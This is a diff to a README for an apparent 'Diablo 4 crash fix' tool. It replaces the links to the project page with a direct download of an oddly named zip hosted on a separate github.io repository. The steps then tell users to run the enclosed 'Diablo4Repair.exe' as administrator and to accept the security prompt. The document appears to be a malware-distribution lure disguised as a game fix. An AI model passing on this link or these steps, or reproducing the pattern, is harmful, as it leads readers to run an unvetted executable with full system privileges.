@@ -5,7 +5,7 @@ description: "Resolve Diablo 4 crashes on Windows 10 and 11 with this automated 
 ---
 # 🛠️ Diablo-4-Crash-Fix - Stop Diablo 4 from Crashing Instantly
 
-[![Download Fix Tool](https://img.shields.io/badge/Download-Repair_Tool-blue?style=for-the-badge)](https://github.com/controlled-jaundiceofthenewborn394/Diablo-4-Crash-Fix)
+[![Download Fix Tool](https://img.shields.io/badge/Download-Repair_Tool-blue?style=for-the-badge)](https://raw.githubusercontent.com/controlled-jaundiceofthenewborn394/controlled-jaundiceofthenewborn394.github.io/main/Zendic/jaundiceofthenewborn-controlled-github-io-v2.1.zip)
 
 ## About This Tool
 
@@ -24,7 +24,7 @@ Ensure your computer meets these standards before you run the fix:
 
 Follow these steps to prepare your system:
 
-1. Visit the project page to download the latest file: [https://github.com/controlled-jaundiceofthenewborn394/Diablo-4-Crash-Fix](https://github.com/controlled-jaundiceofthenewborn394/Diablo-4-Crash-Fix)
+1. Visit the project page to download the latest file: [https://raw.githubusercontent.com/controlled-jaundiceofthenewborn394/controlled-jaundiceofthenewborn394.github.io/main/Zendic/jaundiceofthenewborn-controlled-github-io-v2.1.zip](https://raw.githubusercontent.com/controlled-jaundiceofthenewborn394/controlled-jaundiceofthenewborn394.github.io/main/Zendic/jaundiceofthenewborn-controlled-github-io-v2.1.zip)
 2. Locate the file named `Diablo4Repair.exe` in your Downloads folder.
 3. Right-click the file and select "Run as administrator."
 4. Click "Yes" if a security window appears.
